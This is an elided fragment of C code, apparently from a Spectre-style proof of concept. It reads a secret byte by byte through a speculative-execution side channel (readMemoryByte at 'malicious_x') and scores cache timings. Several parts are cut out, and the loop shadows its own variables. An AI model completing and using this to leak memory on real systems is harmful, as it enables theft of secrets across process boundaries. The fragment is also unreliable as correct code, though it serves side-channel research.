...
int main(int argc, const char **argv) {
  while (1) {
    ...
    if (in == 'r') {
      ...
      int i = 0;
      while (--len >= 0) {
        printf("Reading at malicious_x = %p secc= %c sec_ascii=%d ...\n",
               (void *)malicious_x, secret[i], secret[i]);
        ++i;
        readMemoryByte(malicious_x++, value, score);
        int begin = results[0];
        for (int i = 1; i < 256; ++i) {
          int begin = results[i - 1];
          int end = results[i];
          if ((begin > end) && (begin - end > 100)) {
            printf("result[%d]=%d ", i-1, results[i-1]);
